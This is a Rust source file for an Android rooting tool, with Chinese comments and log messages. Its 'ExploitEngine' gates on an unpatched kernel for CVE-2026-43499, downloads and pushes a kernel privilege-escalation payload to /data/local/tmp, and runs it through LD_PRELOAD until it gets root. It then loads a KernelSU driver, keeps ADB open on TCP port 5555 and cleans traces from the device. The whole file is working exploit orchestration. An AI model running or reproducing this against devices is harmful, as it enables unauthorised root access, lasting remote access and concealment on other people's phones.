use std::path::{Path, PathBuf};
use std::time::Duration;
use reqwest::Client;
use tokio::sync::mpsc::UnboundedSender;
use tokio::time::sleep;

use crate::catalog::CatalogV5;
use crate::device::GateStatus;
use crate::error::{Result, RmvError};
use crate::event::{EngineEvent, EngineStatus, LogLevel, Phase};
use crate::history::{HistoryManager, RunRecord};
use crate::ksu::{KsuOrchestrator, KsuVariant};
use crate::payload::{find_local_payload, verify_payload_file};
use crate::persistence::Persistence;
use crate::transport::Transport;

#[derive(Debug, Clone)]
pub struct EngineOptions {
    pub custom_payload: Option<PathBuf>,
    pub custom_catalog_url: Option<String>,
    pub ksu_variant: KsuVariant,
    pub skip_ksu: bool,
    pub attempts: u32,
    pub retry_delay: u64,
    pub save_history: bool,
    pub reboot_first: bool,
    pub force_payload: bool,
    /// 本地载荷库目录，闸门失败时用于按本机指纹回退配对。
    pub payload_dirs: Vec<PathBuf>,
    /// 只解析与校验载荷，不下发、不执行。
    pub dry_run: bool,
}

impl Default for EngineOptions {
    fn default() -> Self {
        Self {
            custom_payload: None,
            custom_catalog_url: None,
            ksu_variant: KsuVariant::SukiSuUltra,
            skip_ksu: false,
            attempts: 3,
            retry_delay: 8,
            save_history: true,
            reboot_first: false,
            force_payload: false,
            payload_dirs: Vec::new(),
            dry_run: false,
        }
    }
}

pub struct ExploitEngine {
    client: Client,
    work_dir: PathBuf,
}

impl ExploitEngine {
    pub fn new(work_dir: impl AsRef<Path>) -> Self {
        Self {
            client: Client::builder()
                .timeout(Duration::from_secs(30))
                .build()
                .unwrap_or_default(),
            work_dir: work_dir.as_ref().to_path_buf(),
        }
    }

    pub async fn run<T: Transport>(
        &self,
        transport: &T,
        options: EngineOptions,
        event_tx: UnboundedSender<EngineEvent>,
    ) -> Result<()> {
        let total_steps = if options.skip_ksu { 5 } else { 6 };
        let _ = event_tx.send(EngineEvent::Status(EngineStatus::Running));

        // 步骤 1: 设备环境与门禁检测
        let _ = event_tx.send(EngineEvent::Step {
            phase: Phase::DeviceCheck,
            index: 1,
            total: total_steps,
            desc: "连接并检测设备硬件指纹与内核构建信息".to_string(),
        });
        if options.reboot_first {
            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Info,
                line: "正在重启设备以获取全新的启动状态 (pristine boot_id)...".to_string(),
            });
            transport.reboot_and_wait(120).await?;
            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Ok,
                line: "设备已重启完成并重新连接就绪".to_string(),
            });
        }


        let device = transport.get_device_info().await?;
        let _ = event_tx.send(EngineEvent::Log {
            level: LogLevel::Ok,
            line: format!(
                "设备: {} ({}), 品牌: {}, 内核构建: {}",
                device.model,
                device.device,
                device.brand,
                device.gki_git_id.as_deref().unwrap_or("未知GKI")
            ),
        });

        match device.evaluate_gate() {
            GateStatus::Vulnerable => {
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Ok,
                    line: "安全门禁通过: 内核未修补 CVE-2026-43499，处于可利用窗口".to_string(),
                });
            }
            GateStatus::Patched { version, reason } => {
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Error,
                    line: format!("门禁拦截: {} ({})", version, reason),
                });
                let _ = event_tx.send(EngineEvent::Status(EngineStatus::Failed));
                return Err(RmvError::UnsupportedKernel { version, reason });
            }
            GateStatus::UnsupportedVersion(v) => {
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Error,
                    line: format!("门禁拦截: 不受支持的内核版本 {}", v),
                });
                let _ = event_tx.send(EngineEvent::Status(EngineStatus::Failed));
                return Err(RmvError::UnsupportedKernel {
                    version: v,
                    reason: "内核主次版本不在 CVE-2026-43499 目标范围".to_string(),
                });
            }
        }

        // 步骤 2: 载荷获取 (自定义文件 或 在线编目匹配)
        let mut market_hint: Option<String> = None;
        let mut payload_local_path = if let Some(custom) = &options.custom_payload {
            let _ = event_tx.send(EngineEvent::Step {
                phase: Phase::Catalog,
                index: 2,
                total: total_steps,
                desc: format!("加载用户自定义载荷: {}", custom.display()),
            });

            if !custom.exists() {
                let err_msg = format!("指定的本地载荷文件不存在: {}", custom.display());
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Error,
                    line: err_msg.clone(),
                });
                return Err(RmvError::ExploitFailed(err_msg));
            }
            custom.clone()
        } else {
            let _ = event_tx.send(EngineEvent::Step {
                phase: Phase::Catalog,
                index: 2,
                total: total_steps,
                desc: "从在线目录 devices.json 检索精确匹配载荷".to_string(),
            });

            let catalog = CatalogV5::fetch_with_url(&self.client, options.custom_catalog_url.as_deref()).await?;
            let (device_entry, kernel_build) = catalog
                .match_payload(&device)
                .ok_or_else(|| RmvError::PayloadNotFound {
                    device: format!("{}/{}", device.model, device.device),
                    kernel: device.kernel_full.clone(),
                })?;
            market_hint = Some(device_entry.market_name.clone());

            let file_info = kernel_build
                .file
                .as_ref()
                .ok_or_else(|| RmvError::PayloadNotFound {
                    device: device.model.clone(),
                    kernel: "匹配成功但该构建未提供下载文件".to_string(),
                })?;

            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Ok,
                line: format!("找到匹配载荷: {} ({} 字节)", file_info.name, file_info.size),
            });

            // 步骤 3: 载荷下载与哈希校验
            let _ = event_tx.send(EngineEvent::Step {
                phase: Phase::Download,
                index: 3,
                total: total_steps,
                desc: format!("下载并校验载荷文件 {}", file_info.name),
            });

            tokio::fs::create_dir_all(&self.work_dir).await?;
            let target_file = self.work_dir.join(&file_info.name);
            CatalogV5::download_payload(&self.client, file_info, &target_file, Some(&event_tx))
                .await?;

            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Ok,
                line: "载荷文件 SHA-256 校验一致".to_string(),
            });

            target_file
        };

        // 载荷身份闸门：拒绝其它机型或其它内核构建的载荷
        let mut gate = verify_payload_file(&payload_local_path, &device);
        if !matches!(&gate, Ok(identity) if identity.has_device_fingerprint)
            && !options.payload_dirs.is_empty()
        {
            if let Some(local) =
                find_local_payload(&options.payload_dirs, &device, market_hint.as_deref())
            {
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Warn,
                    line: format!("当前载荷与设备不匹配，改用本地载荷库: {}", local.display()),
                });
                payload_local_path = local;
                gate = verify_payload_file(&payload_local_path, &device);
            }
        }

        match gate {
            Ok(identity) if identity.has_device_fingerprint => {
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Ok,
                    line: format!(
                        "载荷身份校验通过: 内嵌本机内核指纹 {}",
                        device.abogki_fingerprint.as_deref().unwrap_or("-")
                    ),
                });
            }
            Ok(identity) => {
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Error,
                    line: format!(
                        "载荷未内嵌本机内核指纹，无法自证身份 (标签: {})",
                        if identity.labels.is_empty() {
                            "无".to_string()
                        } else {
                            identity.labels.join(", ")
                        }
                    ),
                });
                if !options.force_payload {
                    let _ = event_tx.send(EngineEvent::Status(EngineStatus::Failed));
                    return Err(RmvError::PayloadDeviceMismatch {
                        expected: device
                            .abogki_fingerprint
                            .clone()
                            .unwrap_or_else(|| device.device.clone()),
                        found: "未内嵌任何本机指纹".to_string(),
                        labels: identity.labels.join(", "),
                    });
                }
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Warn,
                    line: "已指定 --force-payload，忽略身份闸门继续下发".to_string(),
                });
            }
            Err(e) => {
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Error,
                    line: format!("载荷身份闸门拦截: {}", e),
                });
                if !options.force_payload {
                    let _ = event_tx.send(EngineEvent::Status(EngineStatus::Failed));
                    return Err(e);
                }
                let _ = event_tx.send(EngineEvent::Log {
                    level: LogLevel::Warn,
                    line: "已指定 --force-payload，忽略身份闸门继续下发".to_string(),
                });
            }
        }

        if options.dry_run {
            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Ok,
                line: format!("dry-run: 校验完成，将下发的载荷为 {}", payload_local_path.display()),
            });
            let _ = event_tx.send(EngineEvent::Status(EngineStatus::Success));
            let _ = event_tx.send(EngineEvent::Completed {
                success: true,
                message: format!(
                    "dry-run 完成，未向设备下发任何文件；载荷: {}",
                    payload_local_path.display()
                ),
            });
            return Ok(());
        }

        // 部署阶段
        let _ = event_tx.send(EngineEvent::Step {
            phase: Phase::Deploy,
            index: if options.custom_payload.is_some() { 2 } else { 3 },
            total: total_steps,
            desc: "将提权载荷部署至手机 /data/local/tmp/rmv".to_string(),
        });

        let remote_dir = "/data/local/tmp/rmv";
        let remote_so = "/data/local/tmp/rmv/preload.so";
        let _ = transport
            .exec(&format!("mkdir -p {} && rm -f {} /data/local/tmp/rmv/DONE /data/local/tmp/rmv/live.log", remote_dir, remote_so))
            .await?;
        transport.push(&payload_local_path, remote_so).await?;
        let _ = transport.exec(&format!("chmod 755 {}", remote_so)).await?;

        // 步骤: 执行提权并监听
        let _ = event_tx.send(EngineEvent::Step {
            phase: Phase::Exploit,
            index: if options.custom_payload.is_some() { 3 } else { 4 },
            total: total_steps,
            desc: "在后台拉起 LD_PRELOAD 提权进程并实时探针".to_string(),
        });

        // 检查是否已拥有 root
        let (_, pre_check) = transport.exec("su -c id 2>/dev/null").await?;
        let mut is_rooted = pre_check.contains("uid=0");

        if is_rooted {
            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Ok,
                line: "检测到系统中已具备 Root 权限".to_string(),
            });
        } else {
            let run_cmd = format!(
                "cd {} && (RMV_ATTEMPTS='{}' RMV_RETRY_DELAY='{}' LD_PRELOAD={} /system/bin/true > /data/local/tmp/rmv/live.log 2>&1 &)",
                remote_dir, options.attempts, options.retry_delay, remote_so
            );
            let _ = transport.exec(&run_cmd).await?;

            // 轮询等待 Root 权限达成，等待窗口随尝试轮次伸缩
            let timeout_limit = 60 + 40 * options.attempts as u64;
            let mut elapsed_sec = 0u64;
            let mut last_log_tail = String::new();
            let mut last_attempt: Option<u32> = None;
            let attempt_re = regex::Regex::new(r"rmv exploit attempt (\d+)/(\d+)")
                .expect("static attempt pattern");

            while elapsed_sec < timeout_limit {
                sleep(Duration::from_secs(2)).await;
                elapsed_sec += 2;

                // 单次往返取回：尾部日志 + 完成哨兵 + su 探针
                let (_, probe) = transport
                    .exec(
                        "tail -n 15 /data/local/tmp/rmv/live.log 2>/dev/null; \
                         echo __RMV_DONE__; cat /data/local/tmp/rmv/DONE 2>/dev/null; \
                         echo __RMV_SU__; su -c id 2>/dev/null; echo __RMV_END__",
                    )
                    .await?;

                let tail_part = probe
                    .split("__RMV_DONE__")
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string();
                let done_part = probe
                    .split("__RMV_DONE__")
                    .nth(1)
                    .unwrap_or("")
                    .split("__RMV_SU__")
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string();
                let su_part = probe
                    .split("__RMV_SU__")
                    .nth(1)
                    .unwrap_or("")
                    .split("__RMV_END__")
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string();

                if !tail_part.is_empty() && tail_part != last_log_tail {
                    last_log_tail = tail_part.clone();
                    if let Some(caps) = attempt_re.captures(&tail_part) {
                        last_attempt = caps.get(1).and_then(|m| m.as_str().parse().ok());
                    }
                    let lines: Vec<String> = tail_part
                        .lines()
                        .map(|s| s.trim().to_string())
                        .filter(|s| !s.is_empty())
                        .collect();
                    let _ = event_tx.send(EngineEvent::ExploitLive {
                        attempt: last_attempt,
                        max: Some(options.attempts),
                        lines,
                    });
                }

                if su_part.contains("uid=0") {
                    is_rooted = true;
                    break;
                }

                // 载荷写下的完成哨兵：所有轮次已跑完
                if !done_part.is_empty() {
                    break;
                }
            }

            if !is_rooted {
                let _ = event_tx.send(EngineEvent::Status(EngineStatus::Failed));
                return Err(RmvError::ExploitTimeout {
                    last_attempt,
                    log_tail: last_log_tail,
                });
            }
        }

        let _ = event_tx.send(EngineEvent::Log {
            level: LogLevel::Ok,
            line: "成功取得 UID=0 (Root 权限就绪)".to_string(),
        });

        // 步骤: KernelSU Late-Load
        if !options.skip_ksu {
            let ksu_step = if options.custom_payload.is_some() { 4 } else { 5 };
            let _ = event_tx.send(EngineEvent::Step {
                phase: Phase::Ksu,
                index: ksu_step,
                total: total_steps,
                desc: format!("加载 {} 内核驱动", options.ksu_variant.display_name()),
            });

            KsuOrchestrator::late_load(transport, options.ksu_variant, None).await?;
            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Ok,
                line: format!("{} 驱动加载成功 (Live)", options.ksu_variant.display_name()),
            });
        }

        // 步骤: 持久化配置
        let persist_step = total_steps;
        let _ = event_tx.send(EngineEvent::Step {
            phase: Phase::Persistence,
            index: persist_step,
            total: total_steps,
            desc: "固化 ADB TCP 5555 端口与本地认证密钥".to_string(),
        });

        let persisted = Persistence::setup_adb_tcp(transport).await?;
        if persisted {
            let _ = event_tx.send(EngineEvent::Log {
                level: LogLevel::Ok,
                line: "已固化本地 TCP 5555 通道".to_string(),
            });
        }
        // 清理设备端临时痕迹
        let _ = Persistence::clean_traces(transport, false).await;

        let success_msg = "Root 获取与环境编排全部完成！".to_string();
        let _ = event_tx.send(EngineEvent::Status(EngineStatus::Success));
        let _ = event_tx.send(EngineEvent::Completed {
            success: true,
            message: success_msg.clone(),
        });

        if options.save_history {
            let record = RunRecord {
                id: HistoryManager::new_record_id(),
                timestamp: HistoryManager::current_timestamp(),
                device_model: device.model.clone(),
                device_code: device.device.clone(),
                kernel: device.kernel_full.clone(),
                payload: payload_local_path.display().to_string(),
                ksu_variant: options.ksu_variant.display_name().to_string(),
                success: true,
                message: success_msg,
                logs: vec!["提权与加载成功完成".to_string()],
            };
            let _ = HistoryManager::save_record(&HistoryManager::default_dir(), &record).await;
        }

        Ok(())
}
}
